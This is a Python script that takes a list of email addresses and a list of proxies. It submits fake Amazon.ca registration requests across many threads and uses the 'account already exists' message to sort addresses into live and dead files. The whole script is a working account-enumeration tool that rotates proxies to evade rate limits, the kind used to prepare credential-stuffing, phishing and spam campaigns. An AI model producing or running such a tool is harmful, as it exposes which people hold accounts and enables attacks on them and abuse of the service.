#!/usr/bin/python
import requests
import threading
import random
link = "https://www.amazon.ca/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.ca%2F%3Fref_%3Dnav_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=caflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0"
head = {'User-agent':'Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30'}
def Amazon(email):
 while True:
  try:
   s=requests.Session()
   tt='http://%s' % (random.sample(listaprx,1)[0])
   s.proxies ={'https':tt}
   s.get(link, headers=head)
   xxx = {'customerName':'Azertyaron','email': email,'emailCheck': email,'password':'HAHAHA12@3','passwordCheck':'HAHAHA12@3'}
   pk = s.post(link, headers=head, data=xxx).text
   if "You indicated you are a new customer, but an account already exists with the e-mail" in pk:
     print(email+" Proxy : "+str(tt)+" [ LIVE EMAIL ]")
     open('live.txt','a+').write(email + "\n")
   else:
     print(email+" Proxy : "+str(tt)+" [ DEAD EMAIL ]")
     open('dead.txt','a+').write(email + "\n")
  except Exception as exx:
   continue
  break
txt = input('[X] emails List : ')
filep = input('[X] Proxies List (http) : ')
Threads=input('[X] Threads Number :')
with open(filep) as fileprx:
 listaprx = fileprx.read().split('\n')
 random.shuffle(listaprx)
with open(txt) as file:
 lista = file.read().split('\n')
threadnum = int(Threads)
threads = []
for i in lista:
 thread = threading.Thread(target=Amazon,args=(i.strip(),))
 threads.append(thread)
 thread.start()